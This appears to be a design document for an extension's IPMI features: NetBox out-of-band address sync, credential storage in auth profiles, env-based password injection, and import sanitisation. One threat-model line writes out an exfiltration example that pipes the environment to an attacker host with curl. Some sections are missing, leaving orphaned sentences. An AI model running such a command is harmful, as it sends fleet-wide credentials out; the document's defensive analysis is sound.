## TL;DR

- **Phase 2 (NetBox `oob_ip` → `ipmiHost`)** is small and fully unblocked. The provider adds a second endpoint (`kind: "redfish"`, from `oob_ip`) in `mapEntry` (`src/services/inventory/providers/netboxProvider.ts:418-445`); the sync engine maps it into `ipmiHost` with a new `ServerOrigin.syncedIpmiHost` stamp that follows the **`syncedAuthProfileId` discipline** ("record what the sync wrote; only fill/overwrite what still matches the stamp" — plus one equal-value stamping refinement, row 5a, added in rev12), *not* the `host`/`port` "device always wins" discipline — because Phase 1 users have already hand-typed `ipmiHost` and a device losing its `oob_ip` must never erase it. One PR, ~6 files.
- **Phase 3 (IPMI credentials via auth profiles)** should **reuse the existing `AuthProfile` store** via a new `ServerConfig.ipmiAuthProfileId` link — exactly what Ogun asked for ("assign IPMI credentials via an Auth profile"), and it inherits the editor, SecretStorage keys (`auth-profile-password-{id}`, `src/services/ssh/silentAuth.ts:20-22`), backup export (`src/commands/configCommands.ts:1216-1219`) and deletion sweep for free. Password reaches ipmitool via **terminal env injection** (`createTerminal({ env })` + `ipmitool -E`, which reads `IPMITOOL_PASSWORD` then `IPMI_PASSWORD` — set both), never argv, never the capture buffer — and **only for macros that explicitly opt in** through a new per-macro `provideIpmiCredentials` flag (**rev2: PR #57 review** — token presence is not consent; §3.3). A new token `${profile.ipmiUsername}` joins the whitelist. Shipped SOL template flips to `-U ${profile.ipmiUsername} -E` **and carries the flag**, with masked prompt-into-env as the fallback when no credential is stored (also flag-gated). **rev10 (issue #48 owner feedback) adds the requester's own ask to this PR: direct "Open BMC Console (SOL)" / "Open BMC Web Console" commands on server items (§3.6) plus shipped power on/off/status templates — which together make PR-B the complete answer to their daily workflow (local ipmitool, direct BMC access) and therefore the priority PR.**
- **Phase 4 (jump-host routing)** — REVISED READING (owner correction): Ogun's "from the local shell or via a jump host" means *where ipmitool runs* — locally when the BMC is reachable, **on the jump host** when it isn't — not tunneling the IPMI connection to the local machine. That makes jump-host **execution** the primary deliverable (PR-C): a `localTerminal` macro that **explicitly opts into gateway routing** (`route: "ipmiGateway"`, **rev2: PR #57 review** — a server-level gateway must not silently reroute every local macro; §4.2 Path B) delivers into a session terminal of the gateway server instead, reusing the existing connect-first machinery (`src/commands/serverMacroCommands.ts:260-349`), tokens still resolved against the target server. The UDP analysis below stands as background — `ipmitool -I lanplus` is RMCP+ over UDP/623 and nothing over SSH can tunnel UDP (`TunnelManager` is TCP end to end) — but it now merely *confirms* the jump-host-execution reading rather than constraining the ask; no expectation needs correcting on the issue. The **web console via ephemeral tunnel** (browsers can't run on the jump host, so TCP/443 tunneling is the only jump-host path for the web UI) was demoted to an optional follow-up (PR-D) on demonstrated demand — and **rev10 closes it: the demand was answered *no* on issue #48, so PR-D is NOT PLANNED and its section is reference material only.** PR-C itself is confirmed in shape but **deprioritized behind the template series**, because the requester runs ipmitool locally and PR-B already serves them end to end.
- **Sequencing (rev10):** PR-A = Phase 2 (now). **PR-B = Phase 3 (now, and first — it is the requester's whole daily path once §3.6's commands land).** Then the device-template series. PR-C = Phase 4 jump-host execution — gate satisfied (they route via a host designated for management operations) but deprioritized, since it was raised as future-proofing for other users. PR-D = web-console tunnel: **not planned**.

## Phase 2 — NetBox `oob_ip` → `ipmiHost`

### 2.1 Provider change (`src/services/inventory/providers/netboxProvider.ts`)

`mapEntry` (`:418-445`) already reads `primary_ip.address` (`:432-434`) and emits a single `ssh` endpoint (`:443`). Change:

- Read `obj.oob_ip` with the same defensive shape (`{ address?: unknown } | null | undefined`) and, when it carries a string address, append `{ kind: "redfish", host: stripCidr(address) }` to `endpoints`. `stripCidr` exists (`:63-66`). **Emptiness is checked AFTER the strip, not before (rev12: PR-A implementation review)** — `"/24"` is non-empty going in and empty coming out, so a pre-strip check emits `{ kind: "redfish", host: "" }` onto the tree; the SSH path's `usable` gate has always tested the value it actually emits, and this is the same gate on the value this one emits. **Devices only** — NetBox VMs have no `oob_ip`, so the `kind === "vm"` branch emits nothing new (`vmVars` at `:384-394` already documents the VM field asymmetry precedent).
- No new API call, no new config field: `oob_ip` is on the same `/api/dcim/devices/` rows the pagination already fetches (`brief` mode is already stripped from user filters at `:20`, so full rows are guaranteed).
- **`oob_ip` is always a bare address — confirmed by the requester (rev10: issue #48 owner feedback, open question 6).** After `stripCidr` the value is a host and nothing else, so **the sync path needs no port handling whatsoever**: no parsing, no `host:port` splitting, no port field to map. A port suffix in `ipmiHost` remains a legal *hand-entered* shape (the address rules admit it, `profileTokens.ts:160`/`:199`, and §4.2 Path A's authority parsing is what would consume it) — it is now known to be hand-entry-only, never something PR-A produces. Worth one line in the PR description, because "the field can carry a port" and "our sync ever writes one" are different claims and only the first is true.
- **Endpoint-kind choice:** `"redfish"`, not `"ipmi-sol"`. Both are reserved (`src/models/inventory.ts:5`), but `oob_ip` is a generic OOB address and `ServerConfig.ipmiHost`'s own doc calls itself "IPMI / BMC / Redfish" (`src/models/config.ts:109-110`). The sync engine should select on *either* kind (below), so a third-party provider emitting `ipmi-sol` maps identically — the choice here is cosmetic, and `validateInventoryTree` only requires `kind` to be a string (`src/services/inventory/syncEngine.ts:1052-1054`), so no contract change.
- **Careful with the "skipped" bookkeeping:** the `skippedCount` warning ("devices without a primary IP were skipped") is currently keyed on `mapped.endpoints.length === 0` (`:521,526`). Once an OOB endpoint can exist without a primary IP, that predicate must become "has no `ssh` endpoint", or a device with only an `oob_ip` silently drops out of the warning while still being unmappable to SSH. (The device is still emitted either way — FIX 1's never-drop rule at `:396-416` is untouched, and `presentExternalIds` still protects it from pruning, `syncEngine.ts:316-321`.)

Wire it into both write paths of `computeSyncPlan`:

The stamps-equal clause is what catches it.

The document asserted a fixture that could not exist. §2.3's row 5a is the resolution — the equal-value case is now an eligible write, the stamp-only `after` is genuinely produced, and the stamps-equal term is the only thing standing between it and `unchangedCount`. Keep the plain value clause beside it anyway: it states the visible half of rows 1 and 3 and does not depend on the comparator's membership list staying correct.

### 2.3 `syncedIpmiHost` stamp semantics — the add/update/edit/rollback matrix

**Which discipline?** Not `host`/`port` ("always taken from the device", `:421-424`): Phase 1 shipped `ipmiHost` as a hand-edited field months before sync could write it, so "device always wins" would clobber every early adopter's manual entry on the first post-upgrade sync — and, worse, a device with **no** OOB endpoint would read as "the field should be empty". The correct model is the **`syncedUsername`/`syncedAuthProfileId` model** (`src/models/config.ts:43-92`): the stamp records what the sync itself last wrote, and the sync only writes where the record still carries exactly that.

Decision matrix (`cur` = `ownedServer.ipmiHost`, `stamp` = `origin.syncedIpmiHost`, `oob` = management endpoint's host this fetch):

| cur | stamp | oob | action | why |
|---|---|---|---|---|
| unset | unset | present | **write + stamp** | never configured — the retro-apply-eligible state, same as `syncedAuthProfileId === undefined && authProfileId === undefined` (`:499-527`) |
| unset | set | present | **leave alone** | user *cleared* a synced value — the per-server opt-out clause, verbatim from `:499-508` |
| == stamp | set | present, different | **write + re-stamp** | still exactly what the sync wrote → sync owns it |
| ≠ stamp | any | present | **leave alone; carry stamp forward** | hand-edit; never launder it into the stamp (`:56-60`: "never inferred from the record's current value") |
| set (hand) | unset | present, different | **leave alone** | legacy/Phase-1 hand entry; absent stamp must not mean "sync owns it". Accepted asymmetry vs. `syncedUsername`'s fallback (`:582-594`): there is no `defaultIpmiHost` to fall back to, so absent simply means hands-off |
| **== oob** (any stamp) | any | present, **equal to `cur`** | **row 5a — leave the VALUE alone; record the stamp** *(rev12)* | the value already IS the device's address, so nothing is written — but ownership is recorded, which is what lets the field follow the BMC on the next re-address (row 3) instead of going silently stale. A **refinement** of rows 4 and 5, not a violation: neither row's value is touched |
| any | any | **absent** | **never touch `ipmiHost`; carry stamp forward** | mirrors the provider's own FIX-1 stance (`netboxProvider.ts:396-403`): losing an address at the source is routine maintenance, not a deletion. Accepted staleness: a genuinely removed BMC keeps its last-known address until the user clears it |

- **Row 5a in full (rev12: PR-A implementation review).** The write rule becomes `cur === stamp || cur === oob` (asked, as before, only when the device supplies a management endpoint this fetch).
  - **Why it is needed.** Row 5's "hands-off forever" was correct about the *value* and wrong about the *consequence*. The likeliest Phase-1 hand entry there is — the user opened NetBox, copied the BMC address, and typed it into the server form — can never gain a stamp under `cur === stamp`, so it is permanently excluded from row 3. When the BMC is later re-addressed, that record keeps a dead address and nothing in the product ever says so. The case most likely to occur is the case that loses.
  - **The stamp is the DEVICE's value, never the record's.** Equality *with the device* is the trigger and `mgmtHost` is what gets written into the stamp, so `config.ts`'s "never inferred from the record's current value" rule is preserved intact: a hand edit to some third value still stamps nothing (row 4 unchanged).
  - **The opt-out is untouched, by construction.** Row 2 (`cur` unset + stamp set) cannot be reached from here: row 5a needs `cur === oob`, and `oob` is a non-empty string by selection, so a cleared `cur` can never equal it. Clearing the field remains the per-server opt-out and remains permanent.
  - **Accepted residual (m7 class — the same trade `syncedUsername`/AUTH 3a makes):** a hand-typed value that happens to equal the device's current `oob_ip` is adopted into sync ownership without the user asking. Bounded: from then on the field tracks NetBox, and the user's own value *was* NetBox's value at the moment they typed it. Stated in the engine's matrix comment, not only here.
  - **What it makes real:** the "equal-value stamp-only change lands in `updates`" fixture §2.5 mandates — value byte-identical on both sides, stamp appearing for the first time. That is AUTH 3a's exact shape, and it is the only fixture in this phase that the stamps-equal comparator term is load-bearing for.
- **Rollback safety:** `serverOriginStampsEqual` (`config.ts:173-182`) gains `a.syncedIpmiHost === b.syncedIpmiHost`; `serverOriginsEqual` (`:184-195`) inherits it by construction ("a member added to ServerOrigin can only be forgotten in a single place", `:170-172`), which is what keeps `mergeServerConfigFields`' conditional origin restore (`:273-275`) from dropping a freshly written stamp. `ServerConfig.ipmiHost` itself is **already** in `serverConfigsEqual` (`:221`) and `mergeServerConfigFields` (`:265`) — Phase 1 paid that bill; nothing to do there. `cloneServerConfig` (`:136-142`) spreads `origin` one level deep — a new scalar member is covered.
- **The detach receipt carries the OOB stamp too (rev12: PR-A implementation review).** `DetachedServerOrigin` (`config.ts:203-287`) gains `syncedIpmiHost?`, written by both detach literals (`inventoryCommands.ts`'s Keep Servers stamp and `configCommands.ts`'s rolled-back-import conversion, both omitting the member rather than writing `undefined`) and restored into the new origin by the adoption path (`syncEngine.ts`). It joins `detachedOriginsEqual` and `isValidDetachedServerOrigin` on the same terms as `syncedAuthProfileId`. Without it, Remove Source → Keep Servers → re-add → Adopt loses OOB ownership **permanently**: the adopted record's sync-written address arrives looking hand-typed (row 5) and no later sync can follow the BMC. This is field-for-field the failure `syncedAuthProfileId` was added to the marker for, and the earlier draft's framing of the omission as inherent ("adoption has no receipt for that field") was a decision, now reversed. Row 5a softens but does not close it — self-healing needs the value to still MATCH the device, which is the opposite of the re-addressed BMC this receipt exists for.
- **Known downgrade skew (annotation from the device-template design review, A-M3):** an OLD build's update path rebuilds `origin` from a literal of known members only (`syncEngine.ts:425-466` as of that build), so one sync run on a pre-PR-A build erases `syncedIpmiHost` from every device it updates (any rename/IP change). Back on a new build the record reads as matrix row 5 — hand-set — **silently**. The value itself survives; only sync ownership is lost. This cannot be prevented from the new build's side.
  - **(rev12: PR-A implementation review) — row 5a shortens this considerably, and "hands-off forever" is no longer the right description.** A record whose `ipmiHost` still equals the device's current `oob_ip` — which is every skewed record whose BMC has not moved since, i.e. the overwhelming majority — **self-heals its stamp on the very next sync**, with no user action and no visible change to the field. The residue is only those records whose address ALSO diverged from the device while the stamp was missing, and for those recovery is per-server exactly as before: clearing `ipmiHost` re-enters the write-and-stamp state. Restate as *"hands-off until the value next matches the device's current `oob_ip`"*. Note the transport for this skew is a **downgrade or a backup round-trip through an old build** — globalState is per-machine (no `setKeysForSync` anywhere in `src/`), so Settings Sync is *not* a vector; earlier drafts that said "Settings Sync skew" meant this. Document in the PR description as a known limitation.

### 2.4 Validation: sync time vs use time

- **Use time stays the chokepoint** — `validateTokenValue` (`src/services/profileTokens.ts:481-500`) already refuses a hostile `ipmiHost` at every run, and `ServerConfig.ipmiHost`'s own doc names the substitution site as the enforcement point precisely because values arrive via sync/import (`config.ts:110-115`). Phase 2 adds **no trust** to synced values.
- **Sync time adds a warning, not a rejection:** export the address validator (`isAddressValue`, `profileTokens.ts:251-257` — pure module, no `vscode` import, safe for `syncEngine`) and, when a management endpoint's host fails it, **skip the write and warn** *(rev10: `isAddressValue` is the right validator here even though it also admits a port suffix — synced values are bare addresses by the owner's confirmation (§2.1), so the extra latitude is never exercised on this path, and using a second, stricter validator for sync alone would put two answers to "is this a legal `ipmiHost`?" in the codebase.)* (`Device "X" has an out-of-band address that cannot be used ("…") — ignored.`). Storing a value the chokepoint will refuse on every run helps nobody, and warning at sync is the only moment the user can connect the bad value to its NetBox origin. The device's SSH mapping proceeds untouched.

### 2.5 Tests (fail-against-the-wrong-implementation, per CLAUDE.md)

- `test/unit/` (config model): two origins differing **only** in `syncedIpmiHost` → `serverOriginStampsEqual` false (fails if the comparator is forgotten — the exact vacuous-fixture trap: build them identical elsewhere). - `test/unit/` (syncEngine): one fixture per matrix row above, each constructed so the *wrong* rule visibly diverges:
  - hand-edited `cur ≠ stamp` + device supplies a different `oob` → plan's `after.ipmiHost` is the hand edit (fails against "device always wins");
  - `cur === stamp` + new `oob` → overwritten + re-stamped (fails against "never write");
  - `cur` unset + `stamp` set → not reattached (fails against an implementation missing the opt-out clause);
  - legacy hand-set `cur`, no stamp, device reports a DIFFERENT address → untouched (fails against "absent stamp = sync owns");
  - endpoint absent + sync-owned `cur` → carried forward with stamp intact (fails against "absent endpoint clears the field");

Label the two accordingly.

Build it with TWO servers — one whose stamp still equals the device's address, one whose device has since been re-addressed — because `stamp === oob` and `stamp !== undefined` are two different wrong rules and each survives a fixture carrying only the other's case.
  - **row 5a's payoff, as behaviour:** feed the stamped `after` back in with a moved `oob` → row 3 rewrite. Proves the repair survives into the next run's input rather than only into one plan.
- `test/unit/` (provider): row with `oob_ip: { address: "10.9.9.9/24" }` → second endpoint `{ kind: "redfish", host: "10.9.9.9" }`; `oob_ip: null` → ssh only; **name + oob but no primary_ip** → redfish-only endpoints *and* still counted in the no-SSH warning (fails against the stale `endpoints.length === 0` predicate); **`oob_ip: { address: "/24" }` → no management endpoint AT ALL (rev12)** — asserted as absence rather than as "host is not empty", since the engine's own selector skipping an empty host downstream is a second line of defence, not a licence to emit one (fails against checking emptiness before `stripCidr`).

## Phase 3 — IPMI credentials via Auth profiles

### 3.1 Model: reuse `AuthProfile`, add `ipmiAuthProfileId`

Ogun's ask is literally "assign IPMI credentials via an Auth profile within Nexus". The merged PR #53 model fits: `AuthProfile { id, name, username, authType, keyPath? }` with password in SecretStorage under `auth-profile-password-{id}` (`src/models/config.ts:416-424`; keys minted in `src/services/ssh/silentAuth.ts:20-26`; editor stores/clears the secret in `src/ui/authProfileEditorPanel.ts:231-248`; backup export already round-trips profile passwords, `src/commands/configCommands.ts:1216-1219`). An IPMI credential **is** a username+password pair — an `authType: "password"` profile models it with zero new storage machinery.

**Decision: a parallel link field, not a parallel concept.**

```ts
// ServerConfig (src/models/config.ts:95-125)
/** Auth profile whose username/password are the BMC's credentials. Same
 *  AuthProfile store as `authProfileId`; resolved at run time, never copied. */
ipmiAuthProfileId?: string;
```

- Rejected: a separate `IpmiCredentialProfile` store — would need its own tree, editor, backup section, secret keys and deletion sweep; buys nothing over filtering the existing picker.
- Rejected: per-server `ipmi-password-{serverId}` secrets — contradicts the stated "one universal credential across all hosts" usage; a single shared profile linked from many servers is the shape of the requirement.
- Bookkeeping bill (the Phase-1 checklist from the assessment, §1.2) — **paid once for both of PR-B's new `ServerConfig` fields, `ipmiAuthProfileId` and `bmcWebProtocol` (rev11, §3.6)**: `serverConfigsEqual` + `mergeServerConfigFields` (`config.ts:207-227`, `:252-280`) gain the fields; `validateServerConfig` (`src/utils/validation.ts`) gets the tolerant type check; **`NexusCore.removeAuthProfile` (`src/core/nexusCore.ts:316`) must also clear `ipmiAuthProfileId` links**, and the backup-import dangling-reference sweep in `configCommands.ts` must treat it like `authProfileId` (the `syncedAuthProfileId` doc at `config.ts:85-91` explains why a system-initiated clear differs from a user opt-out — no stamp is involved here, so it's just the clear).
- **Share export must collect and remap through the new link too (rev4: PR #57 review r3, finding 2).** `sanitizeForSharing` (`configCommands.ts:686-726`) randomizes every server and profile id into an `idMap` and then does two things that both currently know about exactly one link field: it builds `referencedProfileIds` from `servers.map((s) => s.authProfileId)` (`:708`) to decide **which profiles ship at all**, and it remaps only `authProfileId` on each server (`:719-725`). The server spread `{ ...s, … }` carries `ipmiAuthProfileId` through **verbatim**, so a bundle exported after PR-B has two defects at once: a profile used *only* for IPMI is not collected and never ships, and every `ipmiAuthProfileId` on the receiving side names an id from the **sender's** installation — a dangling reference that resolves to nothing, or (worse, if the recipient happens to hold that id) to an unrelated local profile. Fix, in PR-B's own scope because PR-B is what creates the field:
  - `referencedProfileIds` collects `s.ipmiAuthProfileId` alongside `s.authProfileId`, so an IPMI-only profile is exported like any other referenced one (redacted the same way — `username: "user"`, `keyPath: undefined`; the password never travels, `authProfilePasswordSecretKey` secrets are not part of the share bundle).
  - each server's `ipmiAuthProfileId` is remapped through `idMap` exactly as `authProfileId` is; a link whose target is not in the export resolves to `undefined` rather than being carried stale — the same "drop the reference rather than ship a dangling one" rule `remapProxy` already applies when a jump host is outside the export (`:672-675`).
  - `ipmiHost` itself keeps travelling verbatim, unchanged and deliberately: it is an address, and share bundles already carry `host`. The share dialog's existing "what's included" framing covers it; this is noted only so the next reader does not read the remap work as a decision to redact addresses.
- **Sync interaction: none in this phase.** `computeSyncPlan` never reads or writes `ipmiAuthProfileId`, so no stamp is needed. (Source-level auto-assignment — "every server this NetBox source syncs gets the universal IPMI profile" — is a natural v2 that would reuse the AUTH 2 retro-apply machinery wholesale; deliberately deferred, see open questions.)

### 3.3 Password pathway: env injection, never argv — gated on an explicit per-macro opt-in (rev2: PR #57 review)

- **Mechanism:** `localTerminalTarget` (`serverMacroCommands.ts:140-155`) currently calls `vscode.window.createTerminal({ name })`. It becomes async-capable (the `MacroSendTarget.send` contract already allows `Promise<boolean>` — `browserTarget` uses it, `:161`) and, when a password is in hand, passes `createTerminal({ name, env: { IPMITOOL_PASSWORD: pw, IPMI_PASSWORD: pw } })`. **Both** variables: ipmitool's `-E` checks `IPMITOOL_PASSWORD` first, then `IPMI_PASSWORD` (ipmi_main.c), and setting both sidesteps version drift. The vault read uses `ctx.secretVault` (`src/commands/types.ts`, `CommandContext.secretVault`) with `authProfilePasswordSecretKey(server.ipmiAuthProfileId)`.
- **When to inject — REVISED (rev2: PR #57 review finding 1). The first draft gated injection on token usage** (`profileTokensUsed(macro.text)` contains `ipmiHost`/`ipmiUsername`). **That gate is unsound and is withdrawn:** token presence in a macro's text is not consent to disclose a secret. Any macro whose text merely *mentions* `${profile.ipmiHost}` — a `ping ${profile.ipmiHost}`, a `curl` against the BMC, an imported/shared macro deliberately written to look innocuous — would have the universal, org-wide BMC password placed into its terminal's environment, where any command that macro runs can read and exfiltrate it. The macro text is user-editable data, not an authorization decision, and this credential is by Ogun's own description the **one universal credential for the whole fleet** — the highest-value secret in the product.

  **Revised gate: injection requires an explicit per-macro opt-in.** `TerminalMacro` (`src/models/terminalMacro.ts:30-83`) gains:

  ```ts
  /** Opt-in: give this macro's local terminal the linked IPMI profile's
   *  password in IPMITOOL_PASSWORD/IPMI_PASSWORD. Only meaningful for
   *  runIn: "localTerminal". ABSENT MEANS FALSE — no injection — so every
   *  existing macro, and every macro from an older build or an import, is
   *  non-privileged by default. UNTRUSTED at every read site like `runIn`
   *  and `group`: read it as `macro.provideIpmiCredentials === true`, never
   *  truthily, so a non-boolean from legacy-settings absorption cannot
   *  become consent. */
  provideIpmiCredentials?: boolean;
  ```

  Injection happens **iff all three hold**: `resolveMacroRunTarget(macro) === "localTerminal"` (`terminalMacro.ts:92-97`), `macro.provideIpmiCredentials === true`, and a password is actually obtained — from the linked `ipmiAuthProfileId`'s vault entry, or, when there is no link or no stored secret, from the flag-gated masked prompt below (cancel aborts the run, so "obtained" is a real precondition, not a formality). **Token presence is not part of the gate in either direction** — a flagged macro that uses no IPMI token still gets the env (it may build the address itself), and an unflagged macro that uses every IPMI token gets nothing. Failure mode of the unflagged case is loud and self-explaining: `ipmitool -E` with no env var exits with its own "password not available" error, in the user's own visible terminal.
  - **Discoverability, not silence:** when a `localTerminal` macro's text uses `ipmiHost`/`ipmiUsername` but the flag is off, the run flow appends a one-line delivery note through the existing note channel (`serverMacroCommands.ts:211-219`) — *"This macro uses IPMI tokens but is not set to receive IPMI credentials; ipmitool will prompt or fail. Enable 'Provide IPMI credentials' in the macro editor."* Token usage thus keeps its *hint* role while losing its *authorization* role, which is the whole of this correction.
  - Cost accepted: one more control in the macro editor (§3.4). That is a strictly better trade than an implicit gate over a fleet-wide credential — and the flag is also the natural place to hang any future capability of the same class.
  - **The flag must be STRIPPED ON IMPORT, or the opt-in is pre-armed for the importing user (rev4: PR #57 review r3, finding 1).** A stored consent flag is only consent if the person it binds is the person who ticked it. `sanitizeImportedMacro` starts from `const macro: TerminalMacro = { ...raw }` (`src/commands/configCommands.ts:956-958`) and then removes only the fields it knows are dangerous — keybinding, `group`, trigger fields, variable `default`s on secrets. **An additive field it has never heard of survives the spread verbatim and is persisted**, and both ingest paths run through it: the share import (`configCommands.ts:1723`, `sanitizeImportedMacro({ ...m, id: randomUUID() })`) and the backup import (`collectIncomingMacros`, `:1070-1077`). So a shared macro carrying `provideIpmiCredentials: true` — text as innocuous as `env | curl -X POST https://attacker/…` — imports **already armed**, and the first run hands over the fleet-wide BMC password with the importing user never having seen a checkbox. The §3.3 gate would be sound and the feature still unsafe, defeated by a field the sanitizer does not know exists.

    **Rule: capability fields are stripped on EVERY import path, and the sanitizer's default for unknown-but-capability-shaped fields is unprivileged.** `sanitizeImportedMacro` gains an explicit, named strip list:

    ```ts
    /** Capability flags: consent belongs to the user who ticked the box in THIS
     *  installation, so no import path may carry one in. Additive capability
     *  fields go here as they are added — a field's default on import is
     *  always the unprivileged one. */
    const IMPORTED_CAPABILITY_FIELDS = ["provideIpmiCredentials", "route"] as const;
    for (const f of IMPORTED_CAPABILITY_FIELDS) { delete (macro as Record<string, unknown>)[f]; }
    ```

    Both fields, not just the credential one. **`route` gets the same treatment** — it redirects execution onto a bastion, so an imported macro carrying `route: "ipmiGateway"` runs its author's command in an SSH session on the importer's jump host, on a box chosen by the importer's own server config. That is a consequential capability by the same standard: the user did not ask for this command to run *there*, and the bastion is usually the most privileged host in the topology. Stripping costs one re-tick of a select; not stripping means an imported macro chooses its own execution host.
  - **Share import vs backup import — strip on BOTH, and here is why the asymmetry was rejected (rev4).** The tempting split is: the sanitized SHARE bundle is foreign by definition → always strip; a BACKUP is the user's own export → keep, since the flag was their own earlier consent. Rejected on three grounds:
    1. **Provenance is not knowable at the strip point.** A backup file is an ordinary file on disk; nothing in it distinguishes "my own export" from "a colleague's backup someone sent me" or "a file downloaded from a ticket attachment". The import flow would be asserting a provenance it cannot check, which is how a security control becomes decorative.
    2. **Both paths already funnel through the same function.** `sanitizeImportedMacro` is the single chokepoint for share and backup alike, so strip-everywhere is one deletion in one place; the asymmetric version requires threading a provenance flag from two call sites into the sanitizer — more code, for a weaker guarantee, in the codebase's most security-sensitive ingest path.
    3. **The recovery cost is trivially small and the failure cost is not.** Restoring your own backup and re-ticking a checkbox on the handful of IPMI macros you own is seconds of work; the failure it buys out is a silent credential disclosure or a command running on a bastion. Asymmetric rules are also the ones users mis-remember — "does my backup keep the flag?" has one answer worth having, and it is "no, capability flags are always re-confirmed here".

    Residual, stated so it is not a surprise: after restoring a backup, IPMI macros need their checkbox re-ticked and their "Run on" re-selected before they work as before. The restore flow should say so once — *"Capability settings on imported macros (IPMI credentials, gateway routing) were reset; re-enable them on the macros you trust."* — rather than letting the first failed run be the notification.
- **Fallback when no password is stored (or no profile linked): masked prompt → env, not argv — and only for flagged macros.** For a macro with `provideIpmiCredentials === true`, the run path prompts with a masked InputBox (the `macroVariablePrompt.ts` discipline: never remembered, cancel aborts) and injects the answer into the terminal env the same way. An unflagged macro never prompts: prompting would be the same disclosure decision moved one dialog later, and a user trained to type the BMC password into whatever box a macro raises is exactly the phishing shape the flag exists to prevent. This means the **shipped SOL template can drop the `$password` variable entirely**:

  ```
  " ipmitool -I lanplus -H ${profile.ipmiHost} -U ${profile.ipmiUsername} -E sol activate\n"
  ```

  (`src/commands/macroCommands.ts:113-136`.) **The shipped template record itself carries `provideIpmiCredentials: true`** (rev2) — the template is the one place where the extension, not an arbitrary macro author, vouches that the command is ipmitool; inserting it is the user's consent act, and the flag is then visible and revocable in the editor like any other macro property. The `-P $password` form dies as documented practice — which was the assessment's §2.5 goal. Keep `$username` prompting? No: `${profile.ipmiUsername}`'s own `missing` refusal points at the server form; for users who genuinely want prompt-per-run, the old template text still works and the docs say so. **Template compatibility note:** templates are copied at insert time, so existing user macros are untouched (and, being unflagged, none of them silently start receiving the credential — the compatibility property the token gate did *not* have); only new inserts get the `-E` form and the flag. (A template insert is a local action, not an import, so the rev4 strip list never touches it — the shipped flags survive insertion, which is the whole point of shipping them: the extension vouching for its own command, on this machine, at the user's request.) A `-E` macro run on an old build (downgrade/backup skew) spawns a terminal without the env var and ipmitool fails with its own clear "password not available" error — degraded but honest, worth a docs line.
- **Shipped template set gains power management (rev10: issue #48 owner feedback).** Ogun named chassis power control alongside SOL as what he actually runs, so PR-B ships three more templates in the same shape as the SOL one — `localTerminal`, `-E`, `provideIpmiCredentials: true`, and the `route` field once PR-C lands:

  ```
  " ipmitool -I lanplus -H ${profile.ipmiHost} -U ${profile.ipmiUsername} -E chassis power status\n"
  " ipmitool -I lanplus -H ${profile.ipmiHost} -U ${profile.ipmiUsername} -E chassis power on\n"
  " ipmitool -I lanplus -H ${profile.ipmiHost} -U ${profile.ipmiUsername} -E chassis power off\n"
  ```

  **Power off is destructive at the server level** — it is an abrupt power cut, not a graceful shutdown — so it carries that in its **name and description** ("IPMI Power Off (hard, no OS shutdown)"), which is where a user reads it in the picker. **No new confirmation mechanism**: macro text is visible in the editor and the picker before anything runs, and the text lands in a terminal the user still has to look at; inventing a per-macro confirm flag for one shipped template would be a mechanism with one caller and a policy question ("which macros are dangerous?") this design has no basis to answer. If a general "confirm before running" macro property is ever wanted it should arrive as a general feature, on its own evidence. (`chassis power cycle`/`reset` deliberately not shipped — easy for a user to write from the shipped shape, and the shipped set should stay the operations everyone needs rather than a catalogue.)
- **Security notes (the checklist for the PR description):** password never enters `resolution.text`, so it can never hit `sendText`, remote `ps`, scrollback, or `TerminalCaptureBuffer`/Copy All (the NexTerminal-specific leak the assessment §2.5 identified); the chokepoint invariant that no substituted value may contain `$`/backtick (`profileTokens.ts:436-442`) is untouched because the password is not a substituted value; env vars are readable from `/proc/self/environ` by the same OS user only — strictly better than argv, same trust boundary as the SSH agent socket; the env var dies with the terminal; **and the environment is populated only for macros whose author explicitly asked for it, so the blast radius of a shared/imported macro is bounded by a flag the importing user can see** (rev2 — this bullet is the one the review's finding 1 added, and it is the one that makes the rest of the list true in practice rather than only in intent); **and that flag cannot arrive from outside this installation — every import path strips it, so "the importing user can see it" means "the importing user ticked it"** (rev4: PR #57 review r3 — without the strip, the previous clause is false for exactly the macros most likely to be hostile, since `sanitizeImportedMacro`'s `{ ...raw }` persists any field it was not taught to remove).

(Sibling: flagged macro whose text uses **no** IPMI token → env **is** injected, which fails against a leftover token-presence condition ANDed onto the flag.)

### 3.6 Direct BMC connect action from the Connection Hub (rev10: issue #48 owner feedback — NEW PR-B scope)

Ogun, unprompted, asked for this and it is the highest-value item in the fold-in: *"adding a direct remote connection option straight from the Connection Hub would be an excellent feature… Implementing both approaches would cover all bases."* Macros are the general mechanism; this is the one-click path for the operation everybody actually performs.

- **`nexus.server.connectBmcSol` — "Open BMC Console (SOL)"**, a context-menu command on server items. It reads the server's `ipmiHost` and `ipmiAuthProfileId`, resolves the password exactly as §3.3 does, spawns a local terminal with the env pair injected, and pre-fills ` ipmitool -I lanplus -H <ipmiHost> -U <username> -E sol activate`. **It is the shipped SOL template's flow with the macro picker removed** — no new pathway, no second implementation: the command composes `localTerminalTarget`'s env-injection step and the same resolution/refusal machinery, so anything true of the template macro is true here.
- **Consent model — the command IS the consent (rev10).** The §3.3 flag exists because a *stored macro record* can arrive from elsewhere carrying a pre-armed capability; a command invocation cannot. The user picking "Open BMC Console (SOL)" on a specific server, in this installation, right now, is a strictly stronger consent signal than a checkbox ticked once — and there is no record to import, so **`IMPORTED_CAPABILITY_FIELDS` and its reasoning (§3.3, rev4) are untouched and unaffected**: no macro is created, nothing is persisted, nothing can be shared or restored. The trust shape is identical to the flag's (an explicit, per-invocation act authorizing one terminal's environment); only the storage question disappears. State this in the PR description so the asymmetry does not read as an oversight.
- **Refusals reuse the typed ones.** Missing `ipmiHost` → the existing `missing` refusal with the **Edit Server** route (`serverMacroCommands.ts:729-738`); missing/blank IPMI auth profile username → same; no stored password → §3.3's masked prompt fallback (here the command invocation is the flag-equivalent that authorizes prompting). Values still pass the substitution chokepoint — a hostile synced `ipmiHost` is refused here exactly as in a macro run, because it is the same `validateTokenValue` call.
- **Menu placement respects B5.** No new `contextValue` variants (`src/ui/nexusTreeProvider.ts:65-68` — the anchored-regex constraint that has held through every prior phase): the entry is **unconditional on server items**, like "Run Macro on Server…", and refuses with an actionable error when unconfigured. Hiding it per-server would require encoding IPMI state into `contextValue`, which is precisely what B5 forbids. Consistent with the standing cut line: *pickers flag, menus don't hide*.
